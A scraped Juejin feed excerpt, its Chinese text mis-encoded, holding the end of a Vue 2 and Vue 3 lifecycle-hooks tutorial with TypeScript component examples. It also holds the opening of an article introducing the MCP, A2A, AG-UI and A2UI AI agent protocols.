<strong><code>onUnmounted</code></strong></td><td>æ³¨æ„ï¼šVue 3 ä¸­å‘½åçš„å˜æ›´</td></tr><tr><td><strong>ç¼“å­˜</strong></td><td><code>activated</code> / <code>deactivated</code></td><td><code>onActivated</code> / <code>onDeactivated</code></td><td>é…åˆ <code>&lt;keep-alive&gt;</code> ä½¿ç”¨</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-3">ä¸‰ã€ è¯¦ç»†è§£æä¸å®æˆ˜åœºæ™¯</h2>
<h3 data-id="heading-4">1. åˆ›å»ºé˜¶æ®µ (Creation)</h3>
<ul>
<li>
<p><strong>Vue 2 (<code>beforeCreate</code> / <code>created</code>)</strong> ï¼š</p>
<ul>
<li><code>beforeCreate</code>ï¼šç»„ä»¶å®ä¾‹åˆšåœ¨å†…å­˜ä¸­è¢«åˆ›å»ºï¼Œæ­¤æ—¶è¿˜æ²¡æœ‰åˆå§‹åŒ–å¥½ <code>data</code> å’Œ <code>methods </code>å±æ€§ã€‚é€‚åˆæ’ä»¶å¼€å‘ï¼Œæ³¨å…¥å…¨å±€å˜é‡ã€‚</li>
<li><code>created</code>ï¼šå®ä¾‹å·²åˆ›å»ºï¼Œå“åº”å¼æ•°æ®<code>dataã€methods</code> å·²å‡†å¤‡å¥½ã€‚
<ul>
<li><strong>åœºæ™¯</strong>ï¼šæœ€æ—©å¯å‘èµ·å¼‚æ­¥è¯·æ±‚çš„æ—¶æœºã€‚</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Vue 3 (<code>setup</code>)</strong> ï¼š</p>
<ul>
<li>åœ¨ Vue 3 ä¸­ï¼Œ<code>setup</code> çš„æ‰§è¡Œæ—©äº <code>beforeCreate</code>ï¼Œå®ƒæ˜¯ç»„åˆå¼ API çš„å…¥å£ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-5">2. æŒ‚è½½é˜¶æ®µ (Mounting)</h3>
<ul>
<li><strong>Vue 2 (<code>beforeMount</code> / <code>mounted</code>)</strong> ï¼š
<ul>
<li>
<p><code>beforeMount</code>ï¼šæ­¤æ—¶å·²ç»å®Œæˆäº†æ¨¡æ¿çš„ç¼–è¯‘ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰æŒ‚è½½åˆ°é¡µé¢ä¸­</p>
</li>
<li>
<p><code>mounted</code>ï¼šæ­¤æ—¶å·²ç»å°†ç¼–è¯‘å¥½çš„æ¨¡æ¿æŒ‚è½½åˆ°äº†é¡µé¢æŒ‡å®šçš„å®¹å™¨ä¸­ï¼Œ<strong>å¯ä»¥è®¿é—®é¡µé¢ä¸­çš„domäº†</strong></p>
<ul>
<li>
<p><strong>åœºæ™¯</strong>ï¼šdomå·²åˆ›å»ºï¼Œå¯ç”¨äºè·å–æ¥å£æ•°æ®å’Œdomå…ƒç´ ã€è®¿é—®å­ç»„ä»¶</p>
</li>
</ul>
</li>
</ul>
</li>
<li><strong>Vue 3 (<code>onBeforeMount</code> / <code>onMounted</code>)</strong> ï¼š
<ul>
<li>
<p><code>onBeforeMount</code>ï¼šæ¨¡æ¿ç¼–è¯‘å®Œæˆï¼Œä½†å°šæœªæ¸²æŸ“åˆ° DOM æ ‘ä¸­ã€‚</p>
</li>
<li>
<p><code>onMounted</code>ï¼šç»„ä»¶å·²æŒ‚è½½ï¼Œå¯ä»¥å®‰å…¨åœ°è®¿é—® DOM å…ƒç´ ã€‚</p>
<ul>
<li><strong>åœºæ™¯</strong>ï¼šè·å–æ¥å£æ•°æ®ã€åˆå§‹åŒ–ç¬¬ä¸‰æ–¹æ’ä»¶ï¼ˆå¦‚ EChartsï¼‰ã€è®¿é—®å­ç»„ä»¶ã€‚</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-6">3. æ›´æ–°é˜¶æ®µ (Updating)</h3>
<ul>
<li>
<p><strong>Vue 2 (<code>beforeUpdate</code> / <code>updated</code>)</strong> ï¼š</p>
<ul>
<li>
<p><code>beforeUpdate</code>ï¼šæ•°æ®çŠ¶æ€æ›´æ–°ä¹‹å‰æ‰§è¡Œï¼Œæ­¤æ—¶ data ä¸­çš„çŠ¶æ€å€¼æ˜¯æœ€æ–°çš„ï¼Œä½†æ˜¯ç•Œé¢ä¸Šæ˜¾ç¤ºçš„æ•°æ®è¿˜æ˜¯æ—§çš„ï¼Œå› ä¸ºæ­¤æ—¶è¿˜æ²¡æœ‰å¼€å§‹é‡æ–°æ¸²æŸ“DOMèŠ‚ç‚¹ã€‚</p>
<ul>
<li><strong>åœºæ™¯</strong> ï¼šæ­¤æ—¶viewå±‚è¿˜æœªæ›´æ–°ï¼Œå¯ç”¨äºè·å–æ›´æ–°å‰å„ç§çŠ¶æ€ã€‚</li>
</ul>
</li>
<li>
<p><code>updated</code>ï¼šå®ä¾‹æ›´æ–°å®Œæ¯•ä¹‹åè°ƒç”¨ï¼Œæ­¤æ—¶ data ä¸­çš„çŠ¶æ€å€¼å’Œç•Œé¢ä¸Šæ˜¾ç¤ºçš„æ•°æ®ï¼Œéƒ½å·²ç»å®Œæˆäº†æ›´æ–°ï¼Œç•Œé¢å·²ç»è¢«é‡æ–°æ¸²æŸ“å¥½äº†ã€‚</p>
</li>
</ul>
</li>
<li>
<p><strong>Vue 3 (<code>onBeforeUpdate</code> / <code>onUpdated</code>)</strong> ï¼š</p>
<ul>
<li><code>onBeforeUpdate</code>ï¼šæ•°æ®å·²æ›´æ–°ï¼Œä½† DOM å°šæœªé‡æ–°æ¸²æŸ“ã€‚å¯ç”¨äºè·å–æ›´æ–°å‰çš„ DOM çŠ¶æ€ã€‚</li>
<li><code>onUpdated</code>ï¼šDOM å·²å®Œæˆæ›´æ–°ã€‚æ³¨æ„ï¼šä¸è¦åœ¨æ­¤é’©å­ä¸­ä¿®æ”¹çŠ¶æ€ï¼Œå¦åˆ™å¯èƒ½å¯¼è‡´æ­»å¾ªç¯ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-7">4. é”€æ¯é˜¶æ®µ (Unmounting / Destruction)</h3>
<ul>
<li>
<p><strong>Vue 2 (<code>beforeDestroy</code> / <code>destroyed</code>)</strong> ï¼š</p>
<ul>
<li><code> beforeDestroy</code>ï¼šå®ä¾‹é”€æ¯ä¹‹å‰è°ƒç”¨ã€‚
<ul>
<li><strong>åœºæ™¯</strong>ï¼šæ¸…ç†å·¥ä½œï¼Œå¦‚ <strong>æ¸…é™¤å®šæ—¶å™¨ (<code>setInterval</code>)ã€è§£ç»‘å…¨å±€äº‹ä»¶ç›‘å¬ã€å–æ¶ˆè®¢é˜…</strong>ã€‚</li>
</ul>
</li>
<li><code>destroyed</code>ï¼šVue å®ä¾‹é”€æ¯åè°ƒç”¨ã€‚ç»„ä»¶å½»åº•ä» DOM ä¸­ç§»é™¤ï¼Œæ‰€æœ‰çš„æŒ‡ä»¤å’Œäº‹ä»¶ç›‘å¬éƒ½ä¼šè¢«è§£é™¤ã€‚</li>
</ul>
</li>
<li>
<p><strong>Vue 3 (<code>onBeforeUnmount</code> / <code>onUnmounted</code>)</strong> ï¼š</p>
<ul>
<li>
<p><code>onBeforeUnmount</code>ï¼šå®ä¾‹é”€æ¯ä¹‹å‰è°ƒç”¨ã€‚</p>
</li>
<li>
<p><code>onUnmounted</code>ï¼šç»„ä»¶å½»åº•ä» DOM ä¸­ç§»é™¤ï¼Œæ‰€æœ‰çš„æŒ‡ä»¤å’Œäº‹ä»¶ç›‘å¬éƒ½ä¼šè¢«è§£é™¤ã€‚</p>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-8">5. ç¼“å­˜é˜¶æ®µ (Keep-alive)</h3>
<p><strong>å¦‚æœä½¿ç”¨äº†keep-aliveç¼“å­˜ç»„ä»¶ä¼šæ–°å¢ä¸¤ä¸ªç”Ÿå‘½å‘¨æœŸå‡½æ•°</strong></p>
<ul>
<li><strong><code>onActivated</code></strong>ï¼šç»„ä»¶è¿›å…¥è§†é‡ï¼Œè¢«é‡æ–°æ¿€æ´»æ—¶è°ƒç”¨ã€‚</li>
<li><strong><code>onDeactivated</code></strong>ï¼šç»„ä»¶ç§»å‡ºè§†é‡ï¼Œè¿›å…¥ç¼“å­˜çŠ¶æ€æ—¶è°ƒç”¨ã€‚</li>
</ul>
<h2 data-id="heading-9">å››ã€ Vue 3 + TypeScript å®æˆ˜æ¼”ç¤º</h2>
<p>ä»¥ä¸‹æ˜¯ä½¿ç”¨ <code>script setup</code> è¯­æ³•ç¼–å†™çš„ç”Ÿå‘½å‘¨æœŸç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div ref="container"&gt;
    &lt;h2&gt;å½“å‰è®¡æ•°ï¼š{{ count }}&lt;/h2&gt;
    &lt;button @click="count++"&gt;å¢åŠ &lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup lang="ts"&gt;
import { 
  ref, 
  onMounted, 
  onBeforeUpdate, 
  onUpdated, 
  onBeforeUnmount 
} from 'vue'

const count = ref&lt;number&gt;(0)
const container = ref&lt;HTMLElement | null&gt;(null)
let timer: number | null = null

// æŒ‚è½½é˜¶æ®µ
onMounted(() =&gt; {
  console.log('Component Mounted. DOM element:', container.value)
  // æ¨¡æ‹Ÿä¸€ä¸ªå®šæ—¶ä»»åŠ¡
  timer = window.setInterval(() =&gt; {
    console.log('Timer running...')
  }, 1000)
})

// è¿è¡Œé˜¶æ®µ
onBeforeUpdate(() =&gt; {
  console.log('Data updated, but DOM is not yet re-rendered.')
})

onUpdated(() =&gt; {
  console.log('Data updated and DOM re-rendered.')
})

// é”€æ¯é˜¶æ®µ
onBeforeUnmount(() =&gt; {
  console.log('Cleanup before unmount.')
  if (timer) {
    clearInterval(timer) // å…³é”®ï¼šé˜²æ­¢å†…å­˜æ³„æ¼
  }
})
&lt;/script&gt;
</code></pre>
<h2 data-id="heading-10">äº”ã€ è¿›é˜¶ï¼šçˆ¶å­ç»„ä»¶ç”Ÿå‘½å‘¨æœŸæ‰§è¡Œé¡ºåº</h2>
<p>ä¸ºäº†æ¸…æ™°èµ·è§ï¼Œæˆ‘ä»¬å°†é¡ºåºæ‹†è§£ä¸ºä¸‰ä¸ªä¸»è¦åœºæ™¯ï¼ˆvue3ï¼‰ï¼š</p>
<h3 data-id="heading-11">1. åˆå§‹æŒ‚è½½é˜¶æ®µ</h3>
<p>çˆ¶ç»„ä»¶å¿…é¡»ç­‰å¾…æ‰€æœ‰å­ç»„ä»¶æŒ‚è½½å®Œæˆåï¼Œæ‰èƒ½å®Œæˆè‡ªå·±çš„æŒ‚è½½é€»è¾‘ã€‚</p>
<ol>
<li><strong>çˆ¶</strong> <code>setup</code>ï¼ˆå¼€å§‹åˆ›å»ºï¼‰</li>
<li><strong>çˆ¶</strong> <code>onBeforeMount</code></li>
<li><strong>å­</strong> <code>setup</code></li>
<li><strong>å­</strong> <code>onBeforeMount</code></li>
<li><strong>å­</strong> <code>onMounted</code> ï¼ˆå­ç»„ä»¶æ¸²æŸ“å®Œæ¯•ï¼Œå‘ä¸Šé€šçŸ¥ï¼‰</li>
<li><strong>çˆ¶</strong> <code>onMounted</code> ï¼ˆçˆ¶ç»„ä»¶æ¥æ”¶åˆ°ä¿¡å·ï¼Œå®£å¸ƒæ•´ä½“æŒ‚è½½å®Œæ¯•ï¼‰</li>
</ol>
<blockquote>
<p><strong>è®°å¿†å£è¯€ï¼š</strong> çˆ¶åˆ› -&gt; å­åˆ› -&gt; å­æŒ‚ -&gt; çˆ¶æŒ‚ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-12">2. æ›´æ–°é˜¶æ®µ</h3>
<p>å½“çˆ¶ç»„ä»¶ä¼ é€’ç»™å­ç»„ä»¶çš„ <code>props</code> å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ›´æ–°é€»è¾‘å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>çˆ¶</strong> <code>onBeforeUpdate</code></li>
<li><strong>å­</strong> <code>onBeforeUpdate</code></li>
<li><strong>å­</strong> <code>onUpdated</code></li>
<li><strong>çˆ¶</strong> <code>onUpdated</code></li>
</ul>
<blockquote>
<p><strong>æ³¨æ„ï¼š</strong> å¦‚æœåªæ˜¯çˆ¶ç»„ä»¶è‡ªèº«çš„ç§æœ‰çŠ¶æ€æ›´æ–°ï¼Œä¸”æœªå½±å“åˆ°å­ç»„ä»¶ï¼Œåˆ™å­ç»„ä»¶çš„æ›´æ–°é’©å­ä¸ä¼šè¢«è§¦å‘ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-13">3. é”€æ¯é˜¶æ®µ</h3>
<p>é”€æ¯è¿‡ç¨‹åŒæ ·æ˜¯â€œé€’å½’â€å¼çš„ï¼Œçˆ¶ç»„ä»¶å…ˆå¯åŠ¨é”€æ¯ï¼Œç­‰å­ç»„ä»¶é”€æ¯å®Œæ¯•åï¼Œçˆ¶ç»„ä»¶æ­£å¼åŠŸæˆèº«é€€ã€‚</p>
<ol>
<li><strong>çˆ¶</strong> <code>onBeforeUnmount</code></li>
<li><strong>å­</strong> <code>onBeforeUnmount</code></li>
<li><strong>å­</strong> <code>unmounted</code></li>
<li><strong>çˆ¶</strong> <code>onUnmounted</code></li>
</ol>
<hr/>
<h2 data-id="heading-14">å…­ã€ Vue 3 + TS æ¨¡æ‹Ÿæ¼”ç¤º</h2>
<p>ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç åœ¨æ§åˆ¶å°ç›´æ¥è§‚å¯Ÿæ‰§è¡Œé€»è¾‘ã€‚</p>
<h3 data-id="heading-15">çˆ¶ç»„ä»¶ <code>Parent.vue</code></h3>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup lang="ts"&gt;
import { onMounted, onBeforeMount } from 'vue'
import Child from './Child.vue'

console.log('1. çˆ¶ - setup')

onBeforeMount(() =&gt; console.log('3. çˆ¶ - onBeforeMount'))
onMounted(() =&gt; console.log('8. çˆ¶ - onMounted'))
&lt;/script&gt;

&lt;template&gt;
  &lt;div class="parent"&gt;
    &lt;h1&gt;çˆ¶ç»„ä»¶&lt;/h1&gt;
    &lt;Child /&gt;
  &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<h3 data-id="heading-16">å­ç»„ä»¶ <code>Child.vue</code></h3>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup lang="ts"&gt;
import { onMounted, onBeforeMount } from 'vue'

console.log('4. å­ - setup')

onBeforeMount(() =&gt; console.log('6. å­ - onBeforeMount'))
onMounted(() =&gt; console.log('7. å­ - onMounted'))
&lt;/script&gt;

&lt;template&gt;
  &lt;div class="child"&gt;å­ç»„ä»¶å†…å®¹&lt;/div&gt;
&lt;/template&gt;
</code></pre>
<hr/>
<h2 data-id="heading-17">ğŸ“ æ€»ç»“ä¸é¿å‘</h2>
<ol>
<li>
<p><strong>æ¥å£è¯·æ±‚æ”¾å“ªé‡Œï¼Ÿ</strong></p>
<ul>
<li>å¦‚æœå­ç»„ä»¶çš„æ¸²æŸ“ä¾èµ–çˆ¶ç»„ä»¶æ¥å£è¿”å›çš„æ•°æ®ï¼Œè¯·åœ¨çˆ¶ç»„ä»¶çš„ <code>created</code>ï¼ˆVue 2ï¼‰æˆ– <code>setup</code>ï¼ˆVue 3ï¼‰ä¸­è¯·æ±‚ã€‚</li>
<li><strong>æ³¨æ„</strong>ï¼šå³ä¾¿ä½ åœ¨çˆ¶ç»„ä»¶çš„ <code>onMounted</code> å‘è¯·æ±‚ï¼Œå­ç»„ä»¶æ­¤æ—¶ä¹Ÿå·²ç»æ¸²æŸ“å®Œæˆäº†ã€‚</li>
</ul>
</li>
<li>
<p><strong>Refs è®¿é—®æ—¶æœº</strong>ï¼š</p>
<ul>
<li>çˆ¶ç»„ä»¶æƒ³é€šè¿‡ <code>ref</code> è®¿é—®å­ç»„ä»¶å®ä¾‹ï¼Œ<strong>å¿…é¡»</strong>åœ¨çˆ¶ç»„ä»¶çš„ <code>onMounted</code> ä¹‹åï¼Œå› ä¸ºåªæœ‰è¿™æ—¶å­ç»„ä»¶æ‰çœŸæ­£æŒ‚è½½å®Œæˆã€‚</li>
</ul>
</li>
<li>
<p><strong>å¼‚æ­¥ç»„ä»¶</strong>ï¼š</p>
<ul>
<li>å¦‚æœå­ç»„ä»¶æ˜¯å¼‚æ­¥ç»„ä»¶ï¼ˆå¦‚ä½¿ç”¨ <code>defineAsyncComponent</code>ï¼‰ï¼Œé¡ºåºä¼šå‘ç”Ÿå˜åŒ–ï¼Œçˆ¶ç»„ä»¶å¯èƒ½ä¼šå…ˆæ‰§è¡Œ <code>onMounted</code>ã€‚</li>
</ul>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¹²è´§æ‹‰æ»¡ï½œAIæ™ºèƒ½ä½“çš„4å¤§æ ¸å¿ƒåè®®ï¼Œçœ‹å®Œè½»æ¾æ‹¿æåº•å±‚é€»è¾‘]]></title>    <link>https://juejin.cn/post/7601028900886855726</link>    <guid>https://juejin.cn/post/7601028900886855726</guid>    <pubDate>2026-01-31T04:48:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601028900886855726" data-draft-id="7601169987395895347" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¹²è´§æ‹‰æ»¡ï½œAIæ™ºèƒ½ä½“çš„4å¤§æ ¸å¿ƒåè®®ï¼Œçœ‹å®Œè½»æ¾æ‹¿æåº•å±‚é€»è¾‘"/> <meta itemprop="keywords" content="Agent,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-31T04:48:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="whinc"/> <meta itemprop="url" content="https://juejin.cn/user/2612095357294343"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¹²è´§æ‹‰æ»¡ï½œAIæ™ºèƒ½ä½“çš„4å¤§æ ¸å¿ƒåè®®ï¼Œçœ‹å®Œè½»æ¾æ‹¿æåº•å±‚é€»è¾‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095357294343/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    whinc
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T04:48:46.000Z" title="Sat Jan 31 2026 04:48:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¹²è´§æ‹‰æ»¡ï½œAIæ™ºèƒ½ä½“çš„4å¤§æ ¸å¿ƒåè®®ï¼Œçœ‹å®Œè½»æ¾æ‹¿æåº•å±‚é€»è¾‘</h2>
<p>ç°åœ¨çš„AIæ—©å°±ä¸åªæ˜¯ä¼šèŠå¤©çš„å·¥å…·å•¦â€”â€”èƒ½è‡ªå·±è°ƒç”¨å·¥å…·æŸ¥æ•°æ®ï¼Œèƒ½å’Œå…¶ä»–AIé…åˆå¹²æ´»ï¼Œè¿˜èƒ½éšæ‰‹ç”Ÿæˆå¯ç›´æ¥ç”¨çš„ç•Œé¢ï¼Œå®ç”¨æ€§çœŸçš„æ‹‰æ»¡ï½</p>
<p>ä½†å¾ˆå°‘æœ‰äººçŸ¥é“ï¼Œè¿™ä¸€åˆ‡çš„èƒŒåï¼Œå…¨é 4ä¸ªâ€œéšå½¢åŸºå»ºâ€åœ¨æ’‘ç€â€”â€”MCPã€A2Aã€AG-UIã€A2UIï¼ˆç”Ÿæˆå¼UIæ ¸å¿ƒè§„èŒƒï¼‰ã€‚å®ƒä»¬å°±åƒAIä¸–ç•Œçš„â€œæ²Ÿé€šå¯†ç â€ï¼Œæ‚„æ‚„è§£å†³äº†AIä¸å·¥å…·ã€AIä¸AIã€AIä¸äººä¹‹é—´çš„â€œæ²Ÿé€šä»£æ²Ÿâ€ã€‚</p>
<p>ä»Šå¤©ä¸ç©è™šçš„ï¼Œç”¨æœ€æ¥åœ°æ°”ã€æœ€è½»æ¾çš„è¯­æ°”ï¼ŒæŠŠè¿™4å¤§åè®®è®²é€ï¼Œä¸ç®¡ä½ æ˜¯AIå°ç™½è¿˜æ˜¯è¡Œä¸šä»ä¸šè€…ï¼Œçœ‹å®Œéƒ½èƒ½getæ ¸å¿ƒï¼Œå†ä¹Ÿä¸ç”¨è¢«ä¸“ä¸šæœ¯è¯­åŠé€€ï½</p>
<h3 data-id="heading-1">å…ˆåˆ’é‡ç‚¹ï¼š4å¤§åè®®ï¼Œè§£å†³AIçš„4å¤§â€œå°bugâ€</h3>
<p><img src="https://wsrv.nl?url=http%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2F9nSMOxZ1wiaiaKJhuhDPzLs89FfscPJfCFQTowCgOmAgwuFJib8Dlgr30bBlibRFOUAgRC8M1Y8l06qofOhljMWyCw%2F0%3Fwx_fmt%3Dpng" alt="" loading="lazy"/></p>
<p>åœ¨è¿™4ä¸ªåè®®é—®ä¸–å‰ï¼ŒAIä¸€ç›´è¢«4ä¸ªå°bugå¡ç€è„–å­ï¼Œæ ¹æœ¬æ²¡æ³•æ”¾å¼€æ‰‹è„šå‘åŠ›ï¼Œè¯´èµ·æ¥è¿˜æŒºæ— å¥ˆï¼š</p>
<ul>
<li>
<p>å·¥å…·é€‚é…å¤ªéº»çƒ¦ï¼šAIè°ƒç”¨Excelã€æ•°æ®åº“ï¼Œå¾—ä¸€ä¸ªä¸ªå•ç‹¬é€‚é…ï¼Œå°±åƒç»™æ¯éƒ¨æ‰‹æœºé…ä¸“å±å……ç”µå™¨ï¼Œç¹çåˆè€—æ—¶ï¼›</p>
</li>
<li>
<p>AIä¹‹é—´æ²¡æ³•é…åˆï¼šç™¾åº¦æ–‡å¿ƒã€é˜¿é‡Œé€šä¹‰è¿™ç±»ä¸åŒå¹³å°çš„AIï¼Œå°±åƒå„ç©å„çš„å°æœ‹å‹ï¼Œæ²¡æ³•ååŒå¹²æ´»ï¼Œé‡äº‹åªèƒ½â€œå•å…µä½œæˆ˜â€ï¼›</p>
</li>
<li>
<p>äººæœºäº¤äº’æœ‰ç‚¹å¡ï¼šå’ŒAIç•Œé¢äº’åŠ¨ï¼Œå‘ä¸ªæŒ‡ä»¤è¦ç­‰å¥½å‡ ç§’ï¼Œä½“éªŒæ„Ÿä¸å¤ªå¥½ï¼Œå°±åƒç”¨2Gç½‘åˆ·è§†é¢‘ä¸€æ ·ä¸é¡ºç•…ï¼›</p>
</li>
<li>
<p>ç”Ÿæˆç•Œé¢ä¸å¥½ç”¨ï¼šAIéšæ‰‹ç”Ÿæˆçš„ç•Œé¢ï¼Œè¦ä¹ˆä¹±ç è¦ä¹ˆç”¨ä¸äº†ï¼Œå…¼å®¹æ€§å¤ªå·®ï¼Œæ ¹æœ¬æ²¡æ³•çœŸæ­£è½åœ°ä½¿ç”¨ã€‚</p>
</li>
</ul>
<p>è€ŒMCPã€A2Aã€AG-UIã€A2UIè¿™å››ä¸ªâ€œå°å¸®æ‰‹â€ï¼Œæ­£å¥½ç²¾å‡†ä¿®å¤äº†è¿™4ä¸ªbugï¼Œå®ƒä»¬å„å¸å…¶èŒåˆèƒ½ç»„é˜Ÿå‘åŠ›ï¼Œé»˜é»˜æ’‘èµ·äº†AIæ™ºèƒ½ä½“çš„æ•´ä¸ªè¿è¡Œä½“ç³»ã€‚ä¸‹é¢é€ä¸ªæ‹†è§£ï¼Œå…¨ç¨‹æ— åºŸè¯ã€å…¨æ˜¯å¹²è´§ï¼Œæ…¢æ…¢çœ‹å°±å¥½ï½</p>
